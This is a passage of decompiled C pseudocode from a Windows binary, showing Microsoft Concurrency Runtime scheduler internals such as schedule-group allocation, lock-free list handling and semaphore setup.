  if ( !v3 )
    *(_QWORD *)(this + 464) = j____crtGetTickCount64();
  v6 = InterlockedPopEntrySList((PSLIST_HEADER)(this + 488));
  v7 = v6 != 0 ? (_DWORD *)&v6[-2] : 0;
  if ( !v7 )
  {
    v7 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)this + 64))(this);
    sub_4747A0((volatile signed __int32 *)this, (int)v7);
    _InterlockedIncrement((volatile signed __int32 *)(this + 392));
  }
  sub_47E493(v7);
  v7[39] = 0;
  (*(void (__thiscall **)(_DWORD, _DWORD *))(**(_DWORD **)(this + 428) + 8))(*(_DWORD *)(this + 428), v7);
  if ( v7 )
  {
    v7[4] = 0;
    v7[5] = 0;
  }
  return (int)v7;
}
// 46F7CA: using guessed type __int64 j____crtGetTickCount64(void);

//----- (004757C1) --------------------------------------------------------
signed __int32 __thiscall sub_4757C1(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 82);
}

//----- (004757CE) --------------------------------------------------------
signed __int32 __thiscall sub_4757CE(volatile signed __int32 *this)
{
  return _InterlockedIncrement(this + 83);
}

//----- (004757E8) --------------------------------------------------------
int __thiscall sub_4757E8(int this)
{
  volatile signed __int32 *v2; // edi
  int v3; // eax
  int v4; // esi

  v2 = (volatile signed __int32 *)(this + 308);
  sub_46F085((volatile signed __int32 *)(this + 308));
  v3 = sub_476C6A((int *)(this + 304));
  v4 = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 12) = 1;
  sub_46F19F(v2);
  return v4;
}

//----- (0047581D) --------------------------------------------------------
int __stdcall sub_47581D(_DWORD *a1, int a2, _DWORD *a3)
{
  int v3; // edx
  int result; // eax

  v3 = *a1 + 1;
  if ( v3 <= a2 )
    return sub_47528F(v3, a2, a1, a3);
  result = sub_47528F(v3, a3[16], a1, a3);
  v3 = 0;
  if ( !result )
    return sub_47528F(v3, a2, a1, a3);
  return result;
}

//----- (00475859) --------------------------------------------------------
int __thiscall sub_475859(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  v4 = sub_4758A5(this, *(_DWORD *)(a3 + 184));
  return a2 != *(_DWORD *)(this[9] + 4 * v4) ? *(_DWORD *)(this[9] + 4 * v4) : 0;
}

//----- (00475884) --------------------------------------------------------
int __thiscall sub_475884(_DWORD *this)
{
  int v1; // esi
  int v3; // [esp-4h] [ebp-Ch]

  v3 = this[94];
  v1 = *(_DWORD *)(this[9] + 4 * v3);
  this[94] = sub_4758A5(this, v3);
  return v1;
}

//----- (004758A5) --------------------------------------------------------
int __thiscall sub_4758A5(_DWORD *this, int a2)
{
  do
    a2 = (a2 + 1) % this[11];
  while ( !*(_DWORD *)(*(_DWORD *)(this[9] + 4 * a2) + 188) );
  return a2;
}

//----- (004758C7) --------------------------------------------------------
int __thiscall sub_4758C7(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // edx
  int result; // eax

  v4 = *a2 + 1;
  if ( v4 <= a3 )
    return sub_4752BA(this, v4, a3, a2);
  result = sub_4752BA(this, v4, this[30], a2);
  v4 = 0;
  if ( !result )
    return sub_4752BA(this, v4, a3, a2);
  return result;
}

//----- (004758FC) --------------------------------------------------------
_DWORD *__thiscall sub_4758FC(const void **this, _DWORD *a2)
{
  sub_479A64(a2, this + 1);
  return a2;
}

//----- (00475912) --------------------------------------------------------
int __thiscall sub_475912(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  PSLIST_ENTRY v3; // eax
  int v4; // edx
  _DWORD *v5; // eax

  v3 = InterlockedPopEntrySList(this + 63);
  v4 = v3 != 0 ? (unsigned int)&v3[-3] : 0;
  if ( v4 )
  {
    (v3 != 0 ? &v3[-2] : (struct _SINGLE_LIST_ENTRY *)4)->Next = a2;
    (v3 != 0 ? &v3[-1] : (struct _SINGLE_LIST_ENTRY *)8)->Next = a3;
    goto LABEL_6;
  }
  v5 = operator new(0x10u);
  v4 = (int)v5;
  if ( v5 )
  {
    v5[1] = a2;
    *v5 = &Concurrency::details::RealizedChore::`vftable';
    v5[2] = a3;
LABEL_6:
    *(_DWORD *)(v4 + 12) = 0;
    return v4;
  }
  return 0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4C0A5C: using guessed type void *Concurrency::details::RealizedChore::`vftable';

//----- (0047596F) --------------------------------------------------------
int __thiscall sub_47596F(union _SLIST_HEADER *this)
{
  PSLIST_ENTRY v1; // eax

  v1 = InterlockedPopEntrySList(this + 64);
  return v1 != 0 ? (unsigned int)&v1[-2] : 0;
}

//----- (00475986) --------------------------------------------------------
int __thiscall sub_475986(int *this)
{
  int *v1; // ecx

  v1 = this + 74;
  if ( *v1 )
    return sub_474F90(v1);
  else
    return 0;
}

//----- (00475999) --------------------------------------------------------
PSLIST_ENTRY __cdecl sub_475999(char a1)
{
  PSLIST_ENTRY v2; // esi

  if ( a1 )
  {
    if ( dword_4F0C14 >= 32 )
      return 0;
    _InterlockedIncrement(&dword_4F0C14);
  }
  v2 = InterlockedPopEntrySList(&ListHead);
  if ( !v2 )
  {
    v2 = (PSLIST_ENTRY)operator new(0x308u);
    if ( v2 )
    {
      `eh vector constructor iterator'(
        &v2[1],
        8u,
        0x60u,
        (void (__thiscall *)(void *))sub_47D465,
        (void (__thiscall *)(void *))sub_47D47A);
      LOBYTE(v2[193].Next) = 0;
    }
    else
    {
      v2 = 0;
    }
  }
  LOBYTE(v2[193].Next) = a1;
  return v2;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46C8AE: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 4F0C14: using guessed type int dword_4F0C14;

//----- (00475A19) --------------------------------------------------------
int __thiscall sub_475A19(_DWORD *this, int a2)
{
  if ( *(_DWORD *)(*(_DWORD *)(this[9] + 4 * a2) + 188) )
    return a2;
  else
    return sub_4758A5(this, a2);
}

//----- (00475A3C) --------------------------------------------------------
void __thiscall sub_475A3C(void *this, int a2)
{
  int v2; // ebx
  int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // ecx
  int v7; // [esp+8h] [ebp-4h]

  v2 = a2;
  if ( a2 != *(_DWORD *)this )
  {
    v4 = unknown_libname_28((unsigned __int64)((unsigned int)(a2 + 31) >> 5) >> 30 != 0 ? -1 : 4
                                                                                             * ((unsigned int)(a2 + 31) >> 5));
    v5 = 0;
    v7 = v4;
    v6 = (unsigned int)(*(_DWORD *)this + 31) >> 5;
    if ( v6 )
    {
      do
      {
        *(_DWORD *)(v4 + 4 * v5) = *(_DWORD *)(*((_DWORD *)this + 1) + 4 * v5);
        ++v5;
      }
      while ( v5 < v6 );
      v2 = a2;
    }
    memset((void *)(v4 + 4 * v6), 0, 4 * (((unsigned int)(a2 + 31) >> 5) - v6));
    j_j_j___free_base(*((void **)this + 1));
    *((_DWORD *)this + 1) = v7;
    *(_DWORD *)this = v2;
  }
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (00475ABB) --------------------------------------------------------
void __thiscall sub_475ABB(void **this, int a2)
{
  unsigned int v3; // ebx
  int v4; // edx
  unsigned int v5; // ecx
  void *i; // [esp+Ch] [ebp-4h]

  v3 = (unsigned int)*this;
  if ( (void *)a2 != *this )
  {
    sub_475A3C(this, a2);
    v4 = unknown_libname_28((unsigned __int64)(unsigned int)a2 >> 30 != 0 ? -1 : 4 * a2);
    v5 = 0;
    for ( i = (void *)v4; v5 < v3; ++v5 )
      *(_DWORD *)(v4 + 4 * v5) = *((_DWORD *)this[2] + v5);
    memset((void *)(v4 + 4 * v3), 0, 4 * (a2 - v3));
    j_j_j___free_base(this[2]);
    this[2] = i;
  }
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (00475B2C) --------------------------------------------------------
bool __thiscall sub_475B2C(_DWORD *this)
{
  return (this[101] & 0xA0000000) == -1610612736;
}

//----- (00475B3F) --------------------------------------------------------
int __cdecl sub_475B3F(int a1, unsigned int a2)
{
  unsigned int v2; // edx
  unsigned int i; // ecx

  v2 = -2128831035;
  for ( i = 0; i < 4; ++i )
    v2 = 16777619 * (v2 ^ *(unsigned __int8 *)(i + a1));
  return v2 % a2;
}

//----- (00475B6B) --------------------------------------------------------
int __thiscall sub_475B6B(_DWORD *this)
{
  return this[93];
}

//----- (00475B72) --------------------------------------------------------
int __thiscall sub_475B72(_DWORD *this)
{
  int v1; // ebx
  _DWORD *v2; // edi
  unsigned int v3; // esi
  int v4; // ecx
  unsigned int *v5; // eax
  unsigned int v6; // eax
  int v7; // eax
  int v8; // esi
  int v9; // edi
  _DWORD *v10; // esi
  unsigned int v11; // edi
  int v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // ecx
  unsigned int v16; // edi
  char v17; // si
  int v18; // edx
  int (__thiscall **v19)(int *); // eax
  union _SLIST_HEADER *v20; // eax
  int *v21; // esi
  char *v22; // eax
  char *v23; // eax
  bool v24; // zf
  int v25; // edi
  unsigned int *v26; // ebx
  int (__thiscall **v27)(int); // eax
  unsigned int v28; // edx
  int v29; // ecx
  int v30; // eax
  int v31; // esi
  unsigned int v32; // esi
  int v33; // eax
  unsigned int v34; // ecx
  int v35; // ebx
  int (__thiscall *v36)(int, int); // edi
  int v37; // eax
  void (__thiscall ***v38)(_DWORD, _DWORD); // eax
  _DWORD *v39; // ebx
  int Semaphore; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+10h] [ebp-64h] BYREF
  int v44; // [esp+20h] [ebp-54h] BYREF
  void *Block; // [esp+24h] [ebp-50h]
  char *v46; // [esp+28h] [ebp-4Ch]
  union _SLIST_HEADER *v47; // [esp+2Ch] [ebp-48h]
  int v48; // [esp+30h] [ebp-44h] BYREF
  unsigned int v49; // [esp+34h] [ebp-40h] BYREF
  char *v50; // [esp+38h] [ebp-3Ch]
  char *v51; // [esp+3Ch] [ebp-38h]
  int *v52; // [esp+40h] [ebp-34h]
  unsigned int v53; // [esp+44h] [ebp-30h] BYREF
  int v54; // [esp+48h] [ebp-2Ch] BYREF
  int i; // [esp+4Ch] [ebp-28h]
  unsigned int v56; // [esp+50h] [ebp-24h]
  _DWORD *v57; // [esp+54h] [ebp-20h]
  unsigned int v58; // [esp+58h] [ebp-1Ch] BYREF
  int *v59; // [esp+5Ch] [ebp-18h]
  unsigned int v60; // [esp+60h] [ebp-14h]
  _DWORD *v61; // [esp+64h] [ebp-10h]
  int v62; // [esp+70h] [ebp-4h]

  v1 = (int)this;
  v57 = this;
  v2 = 0;
  this[109] = 0;
  this[5] = 0;
  this[11] = 0;
  this[106] = sub_47063D();
  *(_DWORD *)(v1 + 372) = Concurrency::details::platform::GetNextAsyncId();
  *(_DWORD *)(v1 + 44) = sub_471D13();
  v3 = sub_46F720() + 1;
  *(_DWORD *)(v1 + 40) = v3;
  v50 = (char *)v3;
  v4 = (unsigned __int64)v3 >> 28 != 0 ? -1 : 16 * v3;
  v5 = (unsigned int *)unknown_libname_28(__CFADD__(v4, 4) ? -1 : v4 + 4);
  v51 = (char *)v5;
  v62 = 0;
  if ( v5 )
  {
    v2 = v5 + 1;
    *v5 = v3;
    `eh vector constructor iterator'(
      v5 + 1,
      0x10u,
      v3,
      (void (__thiscall *)(void *))sub_473E0E,
      (void (__thiscall *)(void *))sub_4742C4);
  }
  v6 = *(_DWORD *)(v1 + 44);
  v62 = -1;
  *(_DWORD *)(v1 + 28) = v2;
  *(_DWORD *)(v1 + 36) = unknown_libname_28((unsigned __int64)v6 >> 30 != 0 ? -1 : 4 * v6);
  *(_DWORD *)(v1 + 32) = unknown_libname_28((unsigned __int64)*(unsigned int *)(v1 + 44) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(v1 + 44));
  memset(*(void **)(v1 + 36), 0, 4 * *(_DWORD *)(v1 + 44));
  memset(*(void **)(v1 + 32), 0, 4 * *(_DWORD *)(v1 + 44));
  v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 36))(v1);
  v8 = 0;
  *(_DWORD *)(v1 + 176) = v7;
  v60 = 0;
  v53 = 0;
  *(_BYTE *)(v7 + 48) |= 4u;
  v9 = 0;
  for ( i = sub_471D0E(); v9 < *(_DWORD *)(v1 + 40); v8 += 16 )
  {
    sub_475A3C((void *)(v8 + *(_DWORD *)(v1 + 28)), *(_DWORD *)(v1 + 44));
    sub_475A3C((void *)(v8 + *(_DWORD *)(v1 + 28) + 8), i);
    ++v9;
  }
  v10 = (_DWORD *)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v1 + 424) + 16))(*(_DWORD *)(v1 + 424));
  v61 = v10;
  if ( v10 )
  {
    v11 = v60;
    do
    {
      sub_473E26(&v44, i);
      v12 = *v10;
      v62 = 1;
      v58 = (*(int (__thiscall **)(_DWORD *))(v12 + 4))(v61);
      v13 = (*(int (__thiscall **)(_DWORD *))(*v61 + 8))(v61);
      v14 = *(_DWORD *)(v1 + 28);
      v50 = (char *)v13;
      v51 = (char *)(16 * v13);
      v56 = v11;
      *(_DWORD *)(*(_DWORD *)(v14 + 16 * v13 + 4) + 4 * (v58 >> 5)) |= 1 << (v58 & 0x1F);
      v52 = (int *)(*(int (__thiscall **)(_DWORD *))(*v61 + 16))(v61);
      v15 = (int)v52;
      v59 = v52;
      if ( v52 )
      {
        do
        {
          v54 = (*(int (__thiscall **)(int *))(*(_DWORD *)v15 + 4))(v59);
          sub_47602B((unsigned int *)(v1 + 348), &v54, &v58);
          sub_47602B((unsigned int *)(v1 + 360), &v54, &v53);
          v16 = v11 >> 5;
          v17 = v60 & 0x1F;
          *((_DWORD *)Block + v16) |= 1 << (v60 & 0x1F);
          v18 = *(_DWORD *)&v51[*(_DWORD *)(v1 + 28) + 12];
          *(_DWORD *)(v18 + 4 * v16) |= 1 << v17;
          v11 = v60 + 1;
          v60 = v11;
          v19 = (int (__thiscall **)(int *))*v59;
          v53 = v11;
          v15 = (*v19)(v59);
          v59 = (int *)v15;
        }
        while ( v15 );
      }
      v20 = (union _SLIST_HEADER *)operator new(0xC0u);
      v47 = v20;
      LOBYTE(v62) = 2;
      if ( v20 )
      {
        v21 = (int *)sub_47EBF4(v20, v1, (struct _SINGLE_LIST_ENTRY *)v58);
        v59 = v21;
      }
      else
      {
        v21 = 0;
        v59 = 0;
      }
      LOBYTE(v62) = 1;
      v22 = (char *)operator new(0x88u);
      v46 = v22;
      LOBYTE(v62) = 3;
      if ( v22 )
        v23 = sub_47CE8E(v22, (int)&v44, (int)v50, v21);
      else
        v23 = 0;
      v24 = v52 == 0;
      v51 = v23;
      LOBYTE(v62) = 1;
      v21[1] = (int)v23;
      if ( !v24 )
      {
        v25 = (int)v52;
        v50 = v23 + 16;
        v26 = (unsigned int *)(v23 + 16);
        do
        {
          v49 = v56;
          v48 = (*(int (__thiscall **)(int))(*(_DWORD *)v25 + 4))(v25);
          sub_47602B(v26, &v48, &v49);
          v27 = *(int (__thiscall ***)(int))v25;
          ++v56;
          v25 = (*v27)(v25);
        }
        while ( v25 );
        v1 = (int)v57;
        v11 = v60;
        v21 = v59;
      }
      v28 = v58;
      v29 = (int)v51;
      *(_DWORD *)(*(_DWORD *)(v1 + 36) + 4 * v58) = v21;
      *(_DWORD *)(*(_DWORD *)(v1 + 32) + 4 * v28) = v29;
      v30 = (*(int (__thiscall **)(_DWORD *))*v61)(v61);
      v62 = -1;
      v10 = (_DWORD *)v30;
      v61 = (_DWORD *)v30;
      j_j_j___free_base(Block);
    }
    while ( v10 );
  }
  v31 = v60;
  sub_475ABB((void **)(v1 + 60), v60);
  sub_475ABB((void **)(v1 + 72), v31);
  sub_475A3C((void *)(v1 + 84), v31);
  sub_475ABB((void **)(v1 + 48), v31);
  v32 = 32 * v31;
  v33 = unknown_libname_28((unsigned __int64)v32 >> 30 != 0 ? -1 : 4 * v32);
  v34 = 0;
  for ( *(_DWORD *)(v1 + 92) = v33; v34 < v32; ++v34 )
    *(_DWORD *)(*(_DWORD *)(v1 + 92) + 4 * v34) = 0;
  v35 = *(_DWORD *)(v1 + 424);
  v36 = *(int (__thiscall **)(int, int))(*(_DWORD *)v35 + 8);
  v37 = (*(int (__thiscall **)(_DWORD *, int))(*v57 + 52))(v57, 0x10000);
  v38 = (void (__thiscall ***)(_DWORD, _DWORD))v36(v35, v37);
  v39 = v57;
  v57[107] = v38;
  (**v38)(v38, 0);
  v39[94] = sub_475A19(v39, 0);
  Semaphore = __crtCreateSemaphoreExW(0, 0, 0x7FFFFFFF, 0, 0, 2031619);
  v39[95] = Semaphore;
  if ( !Semaphore )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  (*(void (__thiscall **)(_DWORD *))(*v39 + 76))(v39);
  return sub_477544(1, 4u, v39[93]);
}
// 46BA3A: using guessed type _DWORD __cdecl __crtCreateSemaphoreExW(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46C8AE: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 471D13: using guessed type int sub_471D13(void);
// 475B72: using guessed type _DWORD pExceptionObject[4];

//----- (00476023) --------------------------------------------------------
void __thiscall sub_476023(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 98);
}

//----- (0047602B) --------------------------------------------------------
_DWORD *__thiscall sub_47602B(unsigned int *this, _DWORD *a2, _DWORD *a3)
{
  int v4; // ebx
  _DWORD *v5; // eax
  _DWORD *v6; // edx
  _DWORD *result; // eax

  v4 = sub_475B3F((int)a2, *this);
  if ( sub_47629F(this, a2, v4) )
    return 0;
  v5 = operator new(0xCu);
  v6 = v5;
  if ( v5 )
  {
    *v5 = 0;
    v5[1] = *a2;
    v5[2] = *a3;
  }
  else
  {
    v6 = 0;
  }
  result = v6;
  *v6 = *(_DWORD *)(this[2] + 4 * v4);
  *(_DWORD *)(this[2] + 4 * v4) = v6;
  ++this[1];
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (00476093) --------------------------------------------------------
int *__thiscall sub_476093(int this, _DWORD *a2)
{
  int v3; // ebx
  PSLIST_ENTRY v4; // eax
  int *v5; // esi
  int *v6; // eax
  int v8[4]; // [esp+10h] [ebp-20h] BYREF
  int *v9; // [esp+20h] [ebp-10h]
  int v10; // [esp+2Ch] [ebp-4h]

  v3 = this + 96;
  v4 = InterlockedPopEntrySList((PSLIST_HEADER)(this + 96));
  v5 = 0;
  if ( v4 )
    v5 = (int *)&v4[-13];
  if ( *(_DWORD *)(this + 12) )
  {
    memset(v8, 0, sizeof(v8));
    if ( v5 )
    {
      sub_47FABB(v5, v8);
      goto LABEL_14;
    }
    v5 = (int *)operator new(0x3Cu);
    v9 = v5;
    v10 = 1;
    if ( v5 )
    {
      sub_47EF05((int)v5, this, v8);
      v5[14] = 0;
      *v5 = (int)&Concurrency::details::FairScheduleGroup::`vftable';
      *((_BYTE *)v5 + 48) = 2;
      goto LABEL_12;
    }
LABEL_11:
    v5 = 0;
    goto LABEL_12;
  }
  if ( !v5 )
  {
    v6 = (int *)operator new(0x38u);
    v5 = v6;
    v9 = v6;
    v10 = 0;
    if ( v6 )
    {
      sub_47EF05((int)v6, this, a2);
      *v5 = (int)&Concurrency::details::CacheLocalScheduleGroup::`vftable';
      *((_BYTE *)v5 + 48) = 1;
LABEL_12:
      v10 = -1;
      goto LABEL_14;
    }
    goto LABEL_11;
  }
  sub_47FABB(v5, a2);
LABEL_14:
  sub_47463E(v3, (signed __int32)v5);
  return v5;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4C0ADC: using guessed type void *Concurrency::details::CacheLocalScheduleGroup::`vftable';
// 4C0B1C: using guessed type void *Concurrency::details::FairScheduleGroup::`vftable';

//----- (00476159) --------------------------------------------------------
signed __int32 __thiscall sub_476159(void *this)
{
  signed __int32 v2; // ebx

  if ( (*((_BYTE *)this + 48) & 4) != 0 )
    return 0;
  v2 = _InterlockedDecrement((volatile signed __int32 *)this + 5);
  if ( !v2 )
  {
    (*(void (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
    sub_476D26(*((union _SLIST_HEADER **)this + 1), (signed __int32)this);
  }
  return v2;
}

//----- (00476193) --------------------------------------------------------
bool __thiscall sub_476193(_DWORD *this, int a2)
{
  int v2; // eax
  unsigned int v3; // esi
  unsigned int v4; // edx

  v2 = 0;
  v3 = 0;
  v4 = (unsigned int)(*this + 31) >> 5;
  if ( v4 )
  {
    do
    {
      if ( v2 )
        break;
      v2 = *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4 * v3) & *(_DWORD *)(this[1] + 4 * v3);
      ++v3;
    }
    while ( v3 < v4 );
  }
  return v2 != 0;
}

//----- (004761CF) --------------------------------------------------------
int __thiscall sub_4761CF(int (__cdecl **this)(int), int (__cdecl *a2)(int), int (__cdecl *a3)(int), int a4)
{
  if ( (*(_DWORD *)(a4 + 404) & 0x20000000) != 0 )
    return a2((int)a3);
  *this = a2;
  this[1] = a3;
  return sub_47620B(a4, (int)this);
}

//----- (0047620B) --------------------------------------------------------
int __thiscall sub_47620B(int this, int a2)
{
  _DWORD *v3; // edi

  v3 = (_DWORD *)(this + 324);
  sub_46FC7F((volatile __int32 *)(this + 324));
  *(_DWORD *)(a2 + 8) = sub_476690((volatile signed __int32 *)this);
  *(_DWORD *)(a2 + 12) = 0;
  **(_DWORD **)(this + 320) = a2;
  *(_DWORD *)(this + 320) = a2 + 12;
  return sub_46FCC0(v3);
}

//----- (0047624F) --------------------------------------------------------
char __thiscall sub_47624F(_DWORD *this)
{
  char v1; // dl

  v1 = 0;
  if ( this[6] || this[2] != this[4] || this[3] != this[5] )
    return 1;
  return v1;
}

//----- (0047626B) --------------------------------------------------------
bool __thiscall sub_47626B(unsigned int *this, _DWORD *a2)
{
  bool v3; // bl
  void *v5[2]; // [esp+8h] [ebp-8h] BYREF

  sub_4754EB(this, v5, a2);
  v3 = sub_476193(v5, (int)(this + 12));
  j_j_j___free_base(v5[1]);
  return v3;
}

//----- (0047629F) --------------------------------------------------------
_DWORD *__thiscall sub_47629F(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // ecx

  v3 = *(_DWORD **)(this[2] + 4 * a3);
  if ( !v3 )
    return 0;
  while ( v3[1] != *a2 )
  {
    v3 = (_DWORD *)*v3;
    if ( !v3 )
      return 0;
  }
  return v3;
}

//----- (004762C9) --------------------------------------------------------
_DWORD *__stdcall sub_4762C9(_DWORD *a1, int a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  a1[1] = 0;
  return result;
}

//----- (004762DA) --------------------------------------------------------
char __thiscall sub_4762DA(_DWORD *this, _DWORD *a2)
{
  if ( *a2 == this[84] )
    return 0;
  *a2 = this[84];
  return 1;
}

//----- (004762FC) --------------------------------------------------------
char __thiscall sub_4762FC(int this, struct _SINGLE_LIST_ENTRY *a2)
{
  char v3; // al
  __int32 v5[3]; // [esp+8h] [ebp-Ch] BYREF

  v5[0] = 0;
  if ( sub_4752E9((unsigned int *)this, v5, 0, 0, 0, 0, 12) )
  {
    if ( v5[0] == 2 || (v3 = 0, v5[0] == 8) )
      v3 = 1;
    if ( v3 )
    {
      InterlockedPushEntrySList((PSLIST_HEADER)(this + 512), a2 + 2);
      sub_47C54E((_DWORD **)v5[1], v5[0], 0, 0);
    }
    else
    {
      sub_47C5DF((int)v5, a2);
    }
    return 1;
  }
  else
  {
    InterlockedPushEntrySList((PSLIST_HEADER)(this + 512), a2 + 2);
    return 0;
  }
}

//----- (0047638C) --------------------------------------------------------
DWORD sub_47638C()
{
  sub_46F17C();
  dword_4F0C08 = sub_46F8E5();
  return sub_480B1D();
}
// 46F17C: using guessed type int sub_46F17C(void);
// 4F0C08: using guessed type int dword_4F0C08;

//----- (004763A0) --------------------------------------------------------
BOOL sub_4763A0()
{
  BOOL result; // eax

  sub_480B5F();
  result = sub_46F922(dword_4F0C08);
  dword_4F0C08 = 0;
  return result;
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (004763B9) --------------------------------------------------------
void __thiscall sub_4763B9(_DWORD *this, signed __int64 a2)
{
  volatile signed __int64 *v2; // edi
  unsigned int v3; // esi
  signed __int64 v4; // rax
  _DWORD *v5; // edi
  signed int v6; // ecx
  int v7; // esi
  int v8; // eax
  int v9; // eax
  int v10; // esi
  int v11; // eax
  _DWORD *v12; // esi
  int v13; // eax
  volatile signed __int32 *v14; // [esp+Ch] [ebp-1Ch]
  int v15; // [esp+10h] [ebp-18h] BYREF
  unsigned int v16; // [esp+14h] [ebp-14h]
  _DWORD *v17; // [esp+18h] [ebp-10h]
  int v18; // [esp+1Ch] [ebp-Ch]
  int v19; // [esp+20h] [ebp-8h] BYREF
  _DWORD *v20; // [esp+24h] [ebp-4h]

  v17 = this;
  v2 = (volatile signed __int64 *)(this + 104);
  do
  {
    v3 = *(_DWORD *)v2;
    LODWORD(v4) = *(_DWORD *)v2;
    v16 = this[105];
    HIDWORD(v4) = v16;
  }
  while ( _InterlockedCompareExchange64(v2, a2, v4) != __PAIR64__(v16, v3) );
  v5 = v17;
  v14 = v17 + 77;
  sub_46F085(v17 + 77);
  v6 = 0;
  v16 = 0;
  if ( (int)v17[11] > 0 )
  {
    v7 = a2;
    do
    {
      v8 = v5[8];
      v20 = *(_DWORD **)(v5[9] + 4 * v6);
      v17 = *(_DWORD **)(v8 + 4 * v6);
      v9 = sub_47528F(0, v20[20], &v19, v20 + 4);
      if ( v9 )
      {
        v10 = (int)v20;
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v9 + 264)) > 0x7D0 && *(_DWORD *)(v9 + 284) == 1 )
          {
            *(_DWORD *)(v9 + 284) = 2;
            sub_4747D1(v5 + 76, v9 + 272);
          }
          v9 = sub_47581D(&v19, 0, (_DWORD *)(v10 + 16));
        }
        while ( v9 );
        v7 = a2;
        v18 = a2;
      }
      else
      {
        v18 = v7;
      }
      v11 = sub_47528F(0, v20[40], &v19, v20 + 24);
      if ( v11 )
      {
        v12 = v20;
        do
        {
          if ( (unsigned int)(a2 - *(_DWORD *)(v11 + 264)) > 0x7D0 && *(_DWORD *)(v11 + 284) == 1 )
          {
            *(_DWORD *)(v11 + 284) = 2;
            sub_4747D1(v5 + 76, v11 + 272);
          }
          v11 = sub_47581D(&v19, 0, v12 + 24);
        }
        while ( v11 );
        v7 = v18;
      }
      v13 = sub_4752BA(v17, 0, v17[30], &v15);
      if ( v13 )
      {
        do
        {
          if ( (unsigned int)(v7 - *(_DWORD *)(v13 + 200)) > 0x7D0 && *(_DWORD *)(v13 + 224) == 1 )
          {
            *(_DWORD *)(v13 + 224) = 2;
            sub_4747D1(v5 + 76, v13 + 212);
          }
          v13 = sub_4758C7(v17, &v15, 0);
        }
        while ( v13 );
      }
      else
      {
        v7 = a2;
      }
      v6 = v16 + 1;
      v16 = v6;
    }
    while ( v6 < v5[11] );
  }
  sub_46F19F(v14);
}

//----- (0047657D) --------------------------------------------------------
int __thiscall sub_47657D(int this)
{
  signed __int32 v2; // edx
  signed __int32 v3; // ecx
  signed __int32 i; // eax

  if ( dword_4F0C00 == this )
  {
    sub_46FC8F(&dword_4F0C24);
    dword_4F0C00 = this != dword_4F0C00 ? dword_4F0C00 : 0;
    dword_4F0C24 = 0;
  }
  if ( *(int *)(this + 392) > 1 )
  {
    v2 = *(_DWORD *)(this + 404);
    v3 = v2;
    for ( i = v2; ; v3 = i )
    {
      i = _InterlockedCompareExchange((volatile signed __int32 *)(this + 404), v3 | 0x80000000, i);
      if ( i == v2 )
        break;
      v2 = i;
    }
    if ( (v2 & 0x1FFFFFFF) == 0 )
      sub_474A5B((volatile signed __int32 *)this);
  }
  return sub_474EE3(this);
}
// 4F0C00: using guessed type int dword_4F0C00;
// 4F0C24: using guessed type int dword_4F0C24;

//----- (004765F3) --------------------------------------------------------
int __thiscall sub_4765F3(int this)
{
  _BYTE *v2; // eax
  char v3; // bl
  signed __int32 v4; // eax
  signed __int32 v5; // edx
  int result; // eax

  v2 = sub_46F930(dword_4F0C08);
  if ( v2 && !v2[76] && sub_406D70(v2) == this )
  {
    v3 = 0;
  }
  else
  {
    v3 = 1;
    _InterlockedIncrement((volatile signed __int32 *)(this + 392));
  }
  sub_474D0B((int *)this, 0);
  (*(void (__thiscall **)(int))(*(_DWORD *)this + 84))(this);
  v4 = *(_DWORD *)(this + 404);
  do
  {
    v5 = v4;
    v4 = _InterlockedCompareExchange((volatile signed __int32 *)(this + 404), v4 & 0x9FFFFFFF | 0x20000000, v4);
  }
  while ( v4 != v5 );
  sub_476A28((HANDLE *)this, v4 & 0x1FFFFFFF);
  result = (*(int (__thiscall **)(int))(*(_DWORD *)this + 80))(this);
  if ( v3 )
    return sub_474EE3(this);
  return result;
}
// 4F0C08: using guessed type int dword_4F0C08;

//----- (00476690) --------------------------------------------------------
signed __int32 __thiscall sub_476690(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // ecx
  signed __int32 result; // eax

  v1 = this + 84;
  do
  {
    do
      result = _InterlockedIncrement(v1);
    while ( !result );
  }
  while ( result == -1 );
  return result;
}

//----- (004766A8) --------------------------------------------------------
signed __int32 __thiscall sub_4766A8(volatile signed __int32 *this, volatile signed __int32 *a2)
{
  signed __int32 v2; // esi
  signed __int32 result; // eax

  do
  {
    v2 = *this;
    *a2 = *this;
